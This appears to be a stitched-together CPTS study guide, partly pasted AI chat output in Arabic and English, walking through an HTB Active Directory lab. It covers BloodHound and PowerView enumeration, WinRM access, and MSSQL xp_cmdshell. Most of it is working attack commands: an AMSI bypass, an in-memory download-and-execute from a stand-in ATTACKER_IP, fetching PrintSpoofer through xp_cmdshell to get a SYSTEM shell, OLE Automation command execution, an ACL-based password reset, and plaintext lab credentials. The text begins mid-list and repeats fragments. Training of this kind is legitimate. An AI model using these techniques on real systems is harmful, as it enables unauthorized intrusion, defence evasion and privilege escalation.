2. استورد BloodHound (إذا متاح) وافحص اليوزر تحت خانة `Execution Rights`.
    
3. شيك هل عنده `CanRDP` أو `CanPSRemote` مباشرة أو متوارثة؟
    
4. إذا ماكو BloodHound، حمل PowerView بالذاكرة.
    
5. استعلم عن جروب `Remote Desktop Users` وجروب `Remote Management Users` بالأجهزة المهمة.
    
6. لقيت يوزر عنده صلاحية؟ استخدم `xfreerdp` أو `evil-winrm` لتسجيل الدخول.
    

📐 **جدول الأوامر الأساسية لهذا السكشن:**

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|**سحب أعضاء الـ RDP من سيرفر**|`Get-NetLocalGroupMember -ComputerName MS01 -GroupName "Remote Desktop Users"`|تحتاج PowerView. اسم السيرفر يتغير حسب الهدف.|
|**سحب أعضاء الـ WinRM**|`Get-NetLocalGroupMember -ComputerName MS01 -GroupName "Remote Management Users"`|نفس اللي قبله بس لجروب الإدارة عن بعد.|
|**استخدام استعلامات جاهزة بالـ BloodHound**|تذهب إلى تبويب `Analysis` ثم تختار `Find Workstations where Domain Users can RDP`|يفضل استخدامها في بداية تقييم البيئة لأخذ فكرة سريعة.|

🔢 **أرقام وقيم مهمة:**

- **3389:** البورت الافتراضي للـ RDP.
    
- **5985 / 5986:** البورت الافتراضي للـ WinRM (HTTP/HTTPS).
    
- **1433:** البورت الافتراضي لـ MSSQL.
    
- **SID -513:** رقم المعرف الثابت لـ Domain Users.
    

🚨 **الفخوخ الخاصة بهذا السكشن:**

❌ [فخ ١]: أن تعتقد أن `Domain Users` لا يمتلكون صلاحيات قوية. دائماً افحصهم!

❌ [فخ ٢]: أن تكتفي بالفحص يدوياً وتتجاهل الصلاحيات "المتوارثة" (Delegated) التي لا يظهرها PowerView بسهولة وتتطلب BloodHound.

❌ [فخ ٣]: إهمال فحص سيرفرات الـ Jump Hosts أو الـ RDS لأنها غالباً تحتوي على هذه الـ Misconfigurations.

💡 **Golden Tip:**

إذا حصلت RDP على حاسبة كـ يوزر عادي، لا توقف هنا. هذه الحاسبة تعتبر بيئة خصبة لرفع الصلاحيات (Local Privilege Escalation) لأنها قد تحتوي على برامج غير محدثة، أو قد تتمكن من سرقة Credentials لمدراء يدخلون لنفس السيرفر!

━━━━━

بهيج خلصنا يا حسين. هسة عندك:

✅ ليش هذا الموضوع موجود (Big Picture)

✅ كل المصطلحات الجديدة بالسكشن

✅ كيف السكشن مبني وشنو يبي يعلمك

✅ الشرح العميق لكل مفهوم بأمثلة وتشبيهات

✅ ما لم يقله HTB (الـ gotchas والثغرات بالشرح)

✅ فلاشكاردز السكشن

✅ ورقة غش مخصصة للـ lab

الآن ارجع اقرأ نص السكشن الأصلي بـ HTB — وراح تلاحظ إن كل جملة صارت واضحة وإن فاهم ليش موجودة. بالتوفيق! 💪

---

```
  ══════════════════════════════════════════════════════════════════
  [✓] PHASE_I EXTRACTION COMPLETE
  [✓] THEORETICAL FRAMEWORK LOADED INTO MEMORY
  [→] TRANSITIONING TO LIVE CHALLENGE ENVIRONMENT . . .
  ══════════════════════════════════════════════════════════════════
```

---

## 🎯 PHASE_II — حقل التدريب :: السؤال وطرق الحل الستة

> [!danger] ☣️ PHASE II INITIALIZED · LIVE CHALLENGE ENVIRONMENT **Language:** English — **Size:** ~2,000 Words **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.

---



# Privileged Access — Complete Beginner's Guide to AD Lateral Movement

---

## PRELIMINARY CONCEPT: What Is This Lab Actually Asking?

Before diving in, you need to understand **four core concepts**. Think of them as vocabulary before reading a book:

Concept

Plain English Explanation

**WinRM / PSRemote**

A protocol that lets you run PowerShell commands _remotely_ on another machine over port 5985/5986

**CanPSRemote**

A BloodHound "edge" (relationship arrow) showing that User A has permission to PSRemote into Machine B

**SQLAdmin**

A BloodHound edge showing User A has sysadmin rights on a SQL Server instance

**xp\_cmdshell**

A SQL Server stored procedure that lets you run OS-level commands (like `whoami` or `type file.txt`) directly from a SQL query

> **The Big Picture:** You're mapping privilege paths. A domain user who can't be a local admin can still move laterally by abusing WinRM access or SQL Admin rights. These are exactly the "non-obvious" paths pentesters look for.

---

# 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

## Re-stating the Three Questions Simply

-   **Q1:** "Who else in Active Directory has permission to use WinRM (PowerShell Remoting) to connect to a machine?"
-   **Q2:** "Which specific computer can that person connect to via WinRM? (just the hostname, no FQDN)"
-   **Q3:** "Log into the SQL Server at 172.16.5.150 as `damundsen`, unlock OS command execution, and read a flag file."

## Breaking Down the Attack Chain (Hacker's Mindset)

```
[You start here]
htb-student on ACADEMY-EA-MS01
          │
          ▼
  ENUMERATE: Who has special rights?
  (BloodHound / PowerView)
          │
    ┌─────┴──────┐
    ▼            ▼
CanPSRemote   SQLAdmin
(Q1 + Q2)      (Q3)
    │            │
    ▼            ▼
WinRM login   mssqlclient.py
to a host     → enable xp_cmdshell
              → read flag file
```

**Why enumerate before attacking?**  
In real penetration testing, you never blindly try credentials everywhere. You first _map the domain_, identify _who can go where_, and then _execute only targeted attacks_. BloodHound visualizes thousands of AD relationships instantly — what would take days of manual work takes minutes.

## Core Methodology Justification

The module explicitly tells us to look for three types of "privileged access edges" in BloodHound:

-   `CanRDP` — GUI remote access
-   `CanPSRemote` — PowerShell/WinRM remote access ← **(Q1 & Q2)**
-   `SQLAdmin` — SQL Server sysadmin access ← **(Q3)**

The **fundamental reason** we use BloodHound + PowerView is because:

1.  AD stores these relationships in LDAP — accessible to any authenticated domain user
2.  BloodHound maps _inherited_ permissions (via group memberships) automatically
3.  PowerView can directly query specific local groups on remote machines

---

# 2\. SIX DISTINCT SOLUTION APPROACHES (Basic → Advanced)

---

## 🔵 Approach 1 — BloodHound Custom Cypher Query (Best Visual Method for Q1 & Q2)

**What is this?** BloodHound is a graph database tool that maps Active Directory relationships. You ask it questions using "Cypher" — a query language like SQL, but for graph data.

### Step-by-Step

**Step 1:** RDP into the Windows attack machine from your own machine:

bash

```
# From Linux/Mac (using xfreerdp):
xfreerdp /v:10.129.85.172 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution /cert-ignore

# From Windows: Press Win+R → type mstsc → connect to 10.129.85.172
# Username: htb-student
# Password: Academy_student_AD!
```

**Step 2:** Once inside MS01, open PowerShell and start the Neo4j database (BloodHound's backend):

powershell

```
# Navigate to Neo4j location (usually already running in lab)
# Check if it's running:
Get-Process neo4j -ErrorAction SilentlyContinue
```

**Step 3:** Open BloodHound (desktop icon or `C:\Tools\BloodHound\BloodHound.exe`). Log in with:

```
URL:      bolt://localhost:7687
Username: neo4j
Password: neo4j  (or whatever the lab set)
```

**Step 4:** In BloodHound, find the **Raw Query** bar at the very bottom of the screen. Paste this Cypher query:

cypher

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
RETURN p2
```

**Step 5:** Press **Enter**.

### Expected Outcome ✅

You should see a graph like this:

```
[USERNAME]@INLANEFREIGHT.LOCAL ──[CanPSRemote]──► [COMPUTERNAME].INLANEFREIGHT.LOCAL
```

The **node on the left** = answer to Q1 (the username)  
The **node on the right** = answer to Q2 (click the computer node, copy the "name" field — strip the `.INLANEFREIGHT.LOCAL` part for the computer name only)

### Failure Scenarios ❌

Failure

Why It Happens

"No results" returned

SharpHound hasn't been run yet — the Neo4j database is empty

BloodHound crashes on launch

Neo4j service is not running

Can't log into BloodHound

Wrong Neo4j credentials

Query returns only `forend`

That's expected from the module example — look for _additional_ entries

### Pivot Trigger ⚡

**Stop and move to Approach 2** if: The Cypher query returns zero results, OR if BloodHound won't open. This means the database hasn't been populated with SharpHound data.

---

## 🔵 Approach 2 — Run SharpHound First, Then Re-query BloodHound (If Database Is Empty)

**What is this?** SharpHound is BloodHound's data _collector_. It runs on a Windows machine inside the domain, collects all AD relationships, creates `.json` files, and you import them into BloodHound. Think of SharpHound as "the camera" and BloodHound as "the photo album."

### Step-by-Step

**Step 1:** Open PowerShell on MS01 and run SharpHound:

powershell

```
# Navigate to SharpHound location
cd C:\Tools\

# Run SharpHound to collect all data
.\SharpHound.exe -c All --zipfilename AD_data.zip

# Wait for it to finish (usually 1-3 minutes)
```

### Expected Outcome ✅

```
2024-01-15T10:23:45.1234567-05:00|INFORMATION|Status: 100 objects finished (+100 8.333333)/s -- Using 55 MB RAM
...
2024-01-15T10:24:10.7654321-05:00|INFORMATION|SharpHound Enumeration Completed at 10:24 AM! Happy Graphing!

[*] Saving cache with stats: 50 explicit objects, 50 ghost objects, 1 user properties
[*] Output ready. File: 20240115102345_BloodHound.zip
```

A `.zip` file is created in the current directory.

**Step 2:** Open BloodHound → Click the **Upload Data** button (arrow icon on the right sidebar) → select the `.zip` file.

**Step 3:** Wait for the data to import. Then re-run the Cypher query from Approach 1.

### Failure Scenarios ❌

Failure

Why It Happens

`Access Denied` when running SharpHound

You need to be an authenticated domain user — you are (htb-student), so this is rare

AV/Defender deletes SharpHound

Windows Defender detects it as a hacking tool

SharpHound hangs

Network timeouts contacting domain controller

### Pivot Trigger ⚡

**Stop and move to Approach 3** if: Windows Defender quarantines SharpHound before it can run. You'll see a popup or the `.exe` simply disappears.

---

## 🔵 Approach 3 — PowerView Get-NetLocalGroupMember (Manual Group Enumeration for Q1 & Q2)

**What is this?** Instead of using BloodHound's big-picture view, we directly ask each machine: "Who is in your **Remote Management Users** group?" Members of this group have WinRM/PSRemote access.

### Step-by-Step

**Step 1:** Open PowerShell on MS01. Load PowerView:

powershell

```
# Import PowerView (check common locations)
Import-Module C:\Tools\PowerView.ps1
# OR
Import-Module C:\Tools\PowerSploit\Recon\PowerView.ps1
```

**Step 2:** Enumerate "Remote Management Users" on known hosts:

powershell

```
# Check MS01
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# Check the Domain Controller
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-DC01 -GroupName "Remote Management Users"

# Check the DB server
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-DB01 -GroupName "Remote Management Users"
```

**Step 3:** To enumerate ALL computers in the domain and check each one automatically:

powershell

```
# Get all domain computers first
$computers = Get-DomainComputer | Select-Object -ExpandProperty dnshostname

# Loop through and check each
foreach ($computer in $computers) {
    Write-Host "`n[*] Checking: $computer" -ForegroundColor Cyan
    Get-NetLocalGroupMember -ComputerName $computer -GroupName "Remote Management Users" -ErrorAction SilentlyContinue
}
```

### Expected Outcome ✅

```
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\[USERNAME]    ← This is your Q1 answer
SID          : S-1-5-21-3842939050-3880317879-2865463114-XXXX
IsGroup      : False
IsDomain     : UNKNOWN
```

The `ComputerName` field = your Q2 answer.

### Failure Scenarios ❌

Failure

Why It Happens

`The RPC server is unavailable`

Firewall is blocking, or the remote machine is offline

`Access is denied`

Your current account doesn't have rights to enumerate remote groups

PowerView doesn't load

Path is wrong, or execution policy is blocking scripts

Output is empty

The group exists but has no members with domain accounts

### Pivot Trigger ⚡

**Stop and move to Approach 4** if: You get `Access is denied` on all machines. This means you need different credentials.

---

## 🔵 Approach 4 — PowerView Get-DomainUser + ACL Enumeration (Deeper Dive, No Group Check Needed)

**What is this?** Instead of checking groups, we enumerate ACLs (Access Control Lists) and user properties. Sometimes CanPSRemote rights come from ACLs, not just group membership.

### Step-by-Step

powershell

```
Import-Module C:\Tools\PowerView.ps1

# Find all domain users who are members of groups with PSRemote access
# First: find the group
Get-DomainGroup -Properties Name | Where-Object {$_.name -like "*Remote*"}

# Check members of "Remote Management Users" group at the domain level
Get-DomainGroupMember -Identity "Remote Management Users" -Recurse

# Also check using Get-DomainComputer with computer-side filtering
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | 
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty" -and 
                  $_.ObjectType -match "ms-Mcs-AdmPwd"} | 
    Select-Object SecurityIdentifier, ActiveDirectoryRights
```

### Expected Outcome ✅

```
GroupName   : Remote Management Users
MemberName  : INLANEFREIGHT\[USERNAME]
MemberSID   : S-1-5-21-...
IsGroup     : False
```

### Failure Scenarios ❌

Failure

Why It Happens

Results are empty

The user's rights come from indirect group membership, not direct ACLs

Extremely slow

Recursively enumerating all ACLs in a large domain is slow

### Pivot Trigger ⚡

**Stop and move to Approach 5** if: This is taking more than 5 minutes or returns overwhelming/empty output. Use BloodHound's pre-calculated paths instead.

---

## 🔵 Approach 5 — Connect via WinRM Using Enter-PSSession (Verifying Q2 from Windows)

**What is this?** Once you know the username from Q1 and the hostname from Q2, you verify by actually _connecting_. This approach uses built-in Windows PowerShell — no extra tools needed.

> ⚠️ **Note:** For this to work, you need the password of the Q1 user. In this lab scenario, you may need to look up previously discovered credentials (or the lab may provide them).

### Step-by-Step

powershell

```
# Step 1: Store the password securely
$password = ConvertTo-SecureString "PASSWORD_OF_Q1_USER" -AsPlainText -Force

# Step 2: Create a credential object
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\Q1_USERNAME", $password)

# Step 3: Enter a remote PowerShell session
Enter-PSSession -ComputerName Q2_COMPUTERNAME -Credential $cred
```

### Expected Outcome ✅

Your PowerShell prompt changes to show the remote machine:

powershell

```
[ACADEMY-EA-XXXX]: PS C:\Users\USERNAME\Documents> hostname
ACADEMY-EA-XXXX
[ACADEMY-EA-XXXX]: PS C:\Users\USERNAME\Documents> whoami
inlanefreight\username
[ACADEMY-EA-XXXX]: PS C:\Users\USERNAME\Documents> Exit-PSSession
PS C:\htb>
```

### Failure Scenarios ❌

Failure

Why It Happens

`Access is denied`

Wrong username/password, OR the user truly doesn't have WinRM rights

`WinRM cannot complete the operation`

Port 5985 is blocked by firewall

`The WinRM client cannot process the request`

TrustedHosts not configured (common on workgroup machines)

Credential prompt loops

Kerberos ticket issue — try with IP instead of hostname

### Pivot Trigger ⚡

**Stop and move to Approach 6** if: You're on a Linux host and can't use `Enter-PSSession`. Use `evil-winrm` instead.

---

## 🔵 Approach 6 — mssqlclient.py + xp\_cmdshell (Full Solution for Q3 — Reading the Flag)

**What is this?** `mssqlclient.py` is part of the **Impacket** toolkit. It connects to Microsoft SQL Server using Windows Authentication. Once connected as `damundsen` (who has sysadmin/SQLAdmin rights), you enable `xp_cmdshell` and run operating system commands directly.

### Step-by-Step (Doing this from the Linux Attack Host)

**Step 1:** From the Windows machine MS01, open PowerShell and SSH to the Linux attack host:

bash

```
# In PowerShell on MS01:
ssh htb-student@172.16.5.225
# Password: HTB_@cademy_stdnt!
```

**Step 2:** Verify mssqlclient.py is available:

bash

```
mssqlclient.py --help
# OR
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py --help
```

**Step 3:** Connect to the SQL Server with Windows Authentication:

bash

```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

When prompted, enter:

```
Password: SQL1234!
```

### Expected Connection Output ✅

```
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

**Step 4:** Type `help` to see available commands:

sql

```
SQL> help
```

```
      lcd {path}                 - changes the current local directory to {path}
      exit                       - terminates the server process (and this session)
      enable_xp_cmdshell         - you know what it means
      disable_xp_cmdshell        - you know what it means
      xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
      sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
      ! {cmd}                    - executes a local shell cmd
```

**Step 5:** Enable `xp_cmdshell` (this is a SQL Server feature that runs OS commands):

sql

```
SQL> enable_xp_cmdshell
```

### Expected Output After Enabling ✅

```
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' 
    changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' 
    changed from 0 to 1. Run the RECONFIGURE statement to install.
```

**Step 6:** Verify who you are on the OS level:

sql

```
SQL> xp_cmdshell whoami
```

```
output
------------------------------------------------------------------------
nt service\mssql$sqlexpress

NULL
```

**Step 7:** Read the flag file:

sql

```
SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
```

### Expected Flag Output ✅

```
output
------------------------------------------------------------------------
[FLAG_CONTENT_WILL_APPEAR_HERE]

NULL
```

> 📌 The `NULL` at the end is normal — it just means the last line of output was empty.

**Step 8 (Bonus — check your privileges):**

sql

```
SQL> xp_cmdshell whoami /priv
```

You should see `SeImpersonatePrivilege` is **Enabled** — this means you could escalate to SYSTEM with tools like PrintSpoofer or JuicyPotato!

### Failure Scenarios ❌

Failure

Why It Happens

`Login failed for user 'INLANEFREIGHT\DAMUNDSEN'`

Wrong password, or the account is locked/disabled

`Connection refused` on port 1433

Firewall blocking SQL Server port, or SQL Server not running

`xp_cmdshell` is blocked even after enabling

SQL Server is in a hardened configuration with additional restrictions

Flag file shows `Access denied`

The SQL Server service account doesn't have rights to damundsen's Desktop

Impacket not found

Need to install: `pip3 install impacket`

### Pivot Trigger ⚡

**Stop and move to PowerUpSQL (Windows approach)** if: The Linux mssqlclient.py fails. See the "What If" section below.

---

# 3\. THE "WHAT IF" MASTERCLASS (6 Scenarios for CPTS Preparation)

---

**🔴 What If #1: BloodHound has no data? (Empty database after opening)**

**The Scenario:** You open BloodHound, run the Cypher query, and get zero results. The database is empty.

**Why This Happens:** SharpHound (the collector) hasn't been run yet in this session, OR the collected `.zip` file hasn't been imported.

**The Fix:**

powershell

```
# Step 1: Run SharpHound on MS01
cd C:\Tools\
.\SharpHound.exe -c All --zipfilename bhdata.zip

# Step 2: Note where the zip was saved (usually C:\Tools\YYYYMMDD_HHMMSS_BloodHound.zip)

# Step 3: In BloodHound GUI → Upload Data button (top right) → select the zip
```

**Alternative — Run SharpHound from Memory (AV Evasion):**

powershell

```
# Download and run in memory without touching disk
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFilename bhdata.zip
```

**CPTS Tip:** In real engagements, Defender may block SharpHound. Use `-ExcludeDomainControllers` flag or run during off-hours. Always have a PowerShell-based version as backup.

---

**🔴 What If #2: Windows Defender deletes PowerView or SharpHound?**

**The Scenario:** You try to load `PowerView.ps1` or run `SharpHound.exe` and Windows immediately deletes it or throws a security alert.

**Why This Happens:** Windows Defender has signatures for these tools. Their file hashes are well-known.

**Fix Option A — AMSI Bypass (disables in-memory scanning for the session):**

powershell

```
# This is a classic AMSI bypass (run BEFORE importing PowerView)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Now import PowerView
Import-Module C:\Tools\PowerView.ps1
```

**Fix Option B — Use Built-in AD Module (no external tools):**

powershell

```
# Import the built-in ActiveDirectory module (no AV alert, it's Microsoft-signed)
Import-Module ActiveDirectory

# Enumerate domain computers
Get-ADComputer -Filter * | Select-Object Name

# Enumerate group members
Get-ADGroupMember -Identity "Remote Management Users" -Recursive
```

**Fix Option C — Use .NET classes directly:**

powershell

```
# No external modules needed
$searcher = [adsisearcher]"(objectCategory=computer)"
$searcher.FindAll() | ForEach-Object { $_.Properties.name }
```

**CPTS Tip:** Always have 3+ ways to enumerate without using common tools. The exam may specifically test your ability to enumerate without standard toolsets.

---

**🔴 What If #3: WinRM port 5985 is blocked by a firewall?**

**The Scenario:** You know the user and the target host, but `Enter-PSSession` or `evil-winrm` fails with a connection timeout.

**Why This Happens:** A firewall (Windows Firewall or network perimeter) is blocking TCP port 5985 (HTTP) or 5986 (HTTPS).

**Fix Option A — Try HTTPS on port 5986:**

bash

```
# evil-winrm with SSL
evil-winrm -i TARGET_IP -u USERNAME -p 'PASSWORD' -S -P 5986
```

powershell

```
# Enter-PSSession with HTTPS
$option = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
Enter-PSSession -ComputerName TARGET -Credential $cred -UseSSL -SessionOption $option
```

**Fix Option B — Tunnel WinRM through SMB (if SMB port 445 is open):**

bash

```
# Use CrackMapExec to run commands via SMB instead
crackmapexec smb TARGET_IP -u USERNAME -p 'PASSWORD' -x "whoami"
```

**Fix Option C — Use RDP if available:**

bash

```
xfreerdp /v:TARGET_IP /u:'DOMAIN\USERNAME' /p:'PASSWORD' /dynamic-resolution
```

**CPTS Tip:** Always check multiple remote access channels. If WinRM is blocked, try SMB (445), RDP (3389), or SSH (22). Never assume one blocked port means the host is unreachable.

---

**🔴 What If #4: xp\_cmdshell cannot be enabled? ("You don't have permission to run RECONFIGURE")**

**The Scenario:** You connect to SQL Server with damundsen's credentials, run `enable_xp_cmdshell`, and get a permission error.

**Why This Happens:** `damundsen` might have SQLAdmin rights at the instance level but not `sa` (system administrator) rights needed for RECONFIGURE. Or the SQL Server is on a higher security setting.

**Fix Option A — Check current SQL role:**

sql

```
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
```

If this returns `0`, you are NOT a sysadmin. If `1`, you are.

**Fix Option B — Try enabling manually via T-SQL:**

sql

```
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
```

**Fix Option C — Use linked server attacks (if xp\_cmdshell is truly blocked):**

sql

```
-- Check for linked servers
SQL> SELECT * FROM sys.servers

-- Execute via linked server (if it runs as a different, higher-privileged account)
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME]
```

**Fix Option D — Use OLE Automation instead of xp\_cmdshell:**

sql

```
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', null, 'cmd /c whoami > C:\output.txt';
```

**CPTS Tip:** If all SQL-based OS execution paths are blocked, you might still be able to read sensitive data from the database itself, extract credentials from tables, or escalate via linked server chains.

---

**🔴 What If #5: The damundsen credentials don't work for SQL Server authentication?**

**The Scenario:** You run `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` with password `SQL1234!` and get `Login failed`.

**Why This Happens:** The password was changed back, or the account is locked, or the lab instance was reset.

**Fix Option A — Try without `-windows-auth` (SQL auth mode):**

bash

```
# Try SQL authentication mode instead of Windows auth
mssqlclient.py damundsen@172.16.5.150
# Enter SQL1234! when prompted
```

**Fix Option B — Use PowerUpSQL from Windows to enumerate and authenticate:**

powershell

```
# On Windows MS01
Import-Module C:\Tools\PowerUpSQL\PowerUpSQL.ps1

# First find the SQL instance
Get-SQLInstanceDomain

# Test credentials
Get-SQLQuery -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query "SELECT @@version"
```

**Fix Option C — Re-exploit the ACL chain to reset damundsen's password:**

The module mentions that `wley` has ACL rights to change `damundsen`'s password. If credentials are wrong:

powershell

```
# Using PowerView to reset via ACL
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$UserPassword = ConvertTo-SecureString 'SQL1234!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $UserPassword -Credential $Cred -Verbose
```

**CPTS Tip:** In real engagements, credentials you found might be stale. Always have the exploitation chain documented so you can re-exploit an ACL to reset a password if needed.

---

**🔴 What If #6: The flag file exists but shows "Access Denied" when using xp\_cmdshell?**

**The Scenario:** `enable_xp_cmdshell` worked, commands run, but `xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt` returns `Access is denied`.

**Why This Happens:** `xp_cmdshell` runs as the **SQL Server service account** (e.g., `NT SERVICE\MSSQL$SQLEXPRESS`), NOT as damundsen. The file might only be readable by damundsen's user account.

**Fix Option A — Check who xp\_cmdshell runs as:**

sql

```
SQL> xp_cmdshell whoami
-- Likely returns: nt service\mssql$sqlexpress
```

**Fix Option B — Use SeImpersonatePrivilege to impersonate damundsen:**  
Since SQL service accounts typically have `SeImpersonatePrivilege`, you can escalate to SYSTEM first:

sql

```
-- Upload PrintSpoofer or JuicyPotato to the server
SQL> xp_cmdshell "powershell -c (New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/PrintSpoofer64.exe','C:\Windows\Temp\ps.exe')"

-- Run it to get a SYSTEM shell
SQL> xp_cmdshell "C:\Windows\Temp\ps.exe -i -c cmd"
```

**Fix Option C — Copy the file to a world-readable location:**

sql

```
-- If SYSTEM can read damundsen's desktop (it usually can):
SQL> xp_cmdshell "copy C:\Users\damundsen\Desktop\flag.txt C:\Windows\Temp\flag.txt"
SQL> xp_cmdshell "type C:\Windows\Temp\flag.txt"
```

**Fix Option D — Use PowerShell runas via xp\_cmdshell:**

sql

```
SQL> xp_cmdshell "powershell -c $cred = New-Object PSCredential('INLANEFREIGHT\damundsen',(ConvertTo-SecureString 'SQL1234!' -AsPlainText -Force)); Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {Get-Content C:\Users\damundsen\Desktop\flag.txt}"
```

**CPTS Tip:** Never assume `xp_cmdshell` = instant file access. You need to understand _which account it runs as_ and what that account can access. `SeImpersonatePrivilege` is your golden ticket to escalate from service account to SYSTEM.

---

## 📋 Quick Reference Summary

```
QUESTION 1 & 2 WORKFLOW:
─────────────────────────────────────────────────────────────────
1. RDP → 10.129.85.172 (htb-student / Academy_student_AD!)
2. Open BloodHound → Run Cypher query for CanPSRemote
3. OR: PowerShell → Import PowerView → Get-NetLocalGroupMember
4. Note the USERNAME (Q1) and COMPUTERNAME (Q2)

QUESTION 3 WORKFLOW:
─────────────────────────────────────────────────────────────────
1. SSH to 172.16.5.225 (htb-student / HTB_@cademy_stdnt!)
2. mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
3. Password: SQL1234!
4. SQL> enable_xp_cmdshell
5. SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
6. Submit the flag output
```

> **🎓 CPTS Study Note:** This entire section maps to the "Lateral Movement in Active Directory" domain of the CPTS exam. The key skill being tested is not just knowing _what tools to use_, but _how to chain multiple techniques together_ — enumerate with BloodHound → identify CanPSRemote/SQLAdmin edges → exploit them methodically → retrieve proof of access (flags in a real exam context). Always document each step.

$0.2615,722 tok270s

Responses are AI-generated and can be inaccurate. Review all outputs before relying on them.

Select a modelSelect a model

























تمام! استلمت نص السكشن. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 خريطة المفاهيم → 🟡 هيكل السكشن → 🟠 الشرح العميق → 🔴 ما لا يقوله السكشن → 💎 فلاشكاردز → 📄 ورقة غش السكشن

يله نبدأ... 🚀

━━━━━

### 🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود أصلاً؟

تخيل وياي إنك كدرت تتسلل لداخل بناية شركة ضخمة ومهمة، ولقيت بطاقة تعريفية (باج) مال موظف طايحة بالكاع. أنت هسة تريد تتحرك داخل البناية وتدخل للغرف المهمة (مثل غرفة الخزنة أو الإدارة)، بس المشكلة إن هذا الباج ما مكتوب عليه "مدير" (Administrator).

إذا جربت تكسر الأبواب بالقوة (تستخدم Exploits وثغرات)، راح يشتغل جهاز الإنذار والشرطة (Blue Team) راح تكشفك فوراً. الحل؟ لازم تدور على "أبواب الخدمة" اللي مصممة للموظفين العاديين، وتستغلها حتى تعبر.

هذا السكشن يعالج مشكلة حقيقية جداً في عالم الاختراق والـ Active Directory: **كيف نتحرك جانبياً (Lateral Movement) باستخدام خدمات الإدارة الشرعية بدون ما نكون مدراء (Admins)؟**

الأنظمة وتطبيقات الشركات (مثل Windows و SQL Servers) مصممة حتى تتدار من بُعد. تخيل مدير الـ IT عنده 5000 حاسبة وسيرفر؛ مستحيل يروح لكل حاسبة يدوياً حتى يكتب أمر. لذلك، مايكروسوفت صممت بروتوكولات "إدارة عن بعد" شرعية مثل **WinRM** (Windows Remote Management)، وصممت قواعد بيانات **MSSQL** بيها خصائص تسمح للمسؤول إنه يشغل أوامر داخل النظام.

الخلل الجوهري مو بوجود هذي الخدمات، الخلل يصير لما **مدراء النظام يوزعون صلاحيات هاي الخدمات لأشخاص ما يحتاجوها، أو ينسون يمسحون الصلاحيات القديمة**.

بالواقع، هجمات فدية ضخمة (Ransomware) وعصابات متطورة مثل APT29 ما يستخدمون ثغرات "زيرو داي" معقدة للتحرك بالشبكة. هم ببساطة يسرقون باسورد موظف عادي، ويكتشفون إن هذا الموظف مسموحله يدخل عن بعد (عبر WinRM) لسيرفر قاعدة البيانات (MSSQL)، ومن قاعدة البيانات يفتحون شيل (Shell) على النظام ويحتلونه بالكامل! هذه التقنية تسمى "Living off the Land" (العيش على موارد الأرض)، لأنك تستخدم أدوات النظام ضد النظام نفسه، فبرامج الحماية ما راح تشك بيك لأنك تستخدم أدوات شرعية.

هذا السكشن يقع في مرحلة **Post-Exploitation (ما بعد الاختراق الأولي)** في مسار CPTS. أنت هنا بالفعل تمتلك يوزر (Foothold)، وتريد توسع سيطرتك.

بعد فهمك لهذا السكشن راح تكون قادر على:

